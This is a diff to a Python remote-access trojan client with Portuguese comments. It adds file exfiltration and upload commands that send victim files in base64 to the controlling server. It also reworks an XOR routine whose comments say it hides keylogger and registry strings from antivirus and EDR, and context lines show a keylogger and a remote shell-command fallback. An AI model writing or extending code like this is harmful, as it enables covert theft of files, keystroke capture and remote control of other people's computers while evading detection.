@@ -38,23 +38,29 @@ if os.path.exists(env_path):
 
 
 # -----------------------------------------------------------------------------
-# xor_codec(text, key) -> codifica strings suspeitas
+# xor_codec(data, key) -> aplica XOR byte a byte (encriptar E decriptar)
 # -----------------------------------------------------------------------------
-# Utiliza XOR para encriptar e desencriptar strings que são assinaturas
-# clássicas de malware e que geram sinal para antivirus e EDR's.
-# ord() e chr(): Convertem o caractere para o seu valor numérico ASCII e vice-versa.
-# itertools.cycle(key): Faz com que a chave se repita caso a string original seja maior.
+# XOR é a própria inversa: (x ^ k) ^ k == x. Por isso a MESMA função serve
+# para encriptar e decriptar — basta usar a mesma chave nos dois lados.
+# Esconde strings que são assinaturas clássicas de malware (keylogger, chave
+# de registro, nome de serviço...) e que geram sinal para antivírus e EDR's.
+# key[i % len(key)]: faz a chave se repetir (como itertools.cycle) quando o
+# payload é maior que a chave — sem precisar importar nada extra.
 def xor_codec(data, key):
-    # core: XOR byte a byte
+    # core: XOR byte a byte (entrada e chave em bytes)
     return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
 
 def decrypt_string(cipher_hex, key):
-    # hex -> texto (decriptar)
+    # hex -> bytes (fromhex) -> XOR -> texto UTF-8
+    # Pode falhar com ValueError (hex inválido) ou UnicodeDecodeError (chave errada)
     return xor_codec(bytes.fromhex(cipher_hex), key.encode('utf-8')).decode('utf-8')
 
 
 def env_or_secret(env_name, secret_hex, fallback=""):
+    # Resolve uma config na ordem: .env > decrypt(DECRYPT_KEY) > fallback
+    # Prioriza o valor do ambiente; só decripta quando a variável NÃO existe
+    # E a chave está presente. Nunca quebra a importação (cai no fallback em erro).
     value = os.environ.get(env_name)
     if value:
         return value
@@ -87,6 +93,54 @@ buffer_auto_send_pending = False
 keylogger_active = False
 listener = None
 
+
+def download_file(filepath):
+    try:
+        if not os.path.exists(filepath):
+            return {
+                'success': False,
+                'error': "File not Found"
+            }
+        
+        with open(filepath, 'rb') as f:
+            file_data = f.read()
+
+        return {
+            'success': True,
+            'filename': Path(filepath).name,
+            'data': base64.urlsafe_b64encode(file_data).decode('utf-8'),
+            'size': len(file_data)
+        } 
+
+    except Exception as e:
+        return {
+            'sucess': False,
+            'error': str(e)
+        }
+
+
+def upload_file(filepath, file_base64):
+    try:
+        file_data = base64.b64decode(file_base64)
+        directory = os.path.dirname(filepath)
+
+        if directory and not os.path.exists(filepath):
+            os.makedirs(directory)
+        
+        with open(filepath, 'wb') as f:
+            f.write(file_data)
+
+        return {
+            'success': True,
+            'filename': Path(filepath).name,
+            'size': len(file_data)
+        } 
+
+    except Exception as e:
+        return {
+            'sucess': False,
+            'error': str(e)
+        }
 
 # -----------------------------------------------------------------------------
 # format_key(key) -> string legível da tecla pressionada
@@ -349,7 +403,6 @@ def listen(c):
 #                            devolve a saída (stdout+stderr) ao servidor
 def cmd(c, data):
     try:
-
         if data.startswith("cd "):
             try:
                 os.chdir(data[3:].strip())
@@ -394,6 +447,28 @@ def cmd(c, data):
 
             c.send(response.encode() + b"\n\n")
             return
+
+        elif data.startswith("/download "):
+            filepath = data[10:].strip()
+            c.send(b"[i] Preparing file for download... \n")
+
+            result = download_file(filepath)
+
+            if result['success']:
+                info = (
+                    f"[+] File read for download\n"
+                    f"[i] Filename: {result}\n"
+                    f"[i] Size {result['size']}\n"
+                    f"[FILE_START]\n"
+                )
+                c.send(info.encode())
+                c.send(result['data'].encode())
+                c.send(b"\n[FILE_END]\n\n")
+
+            else:
+                c.send(f"[-] Download failed: {result['error']}\n\n".encode())
+
+            return 
 
         # Fallback: comando de shell. shell=True delega pro interpretador do
         # sistema (cmd.exe), então suporta pipes/redirecionamento. Captura
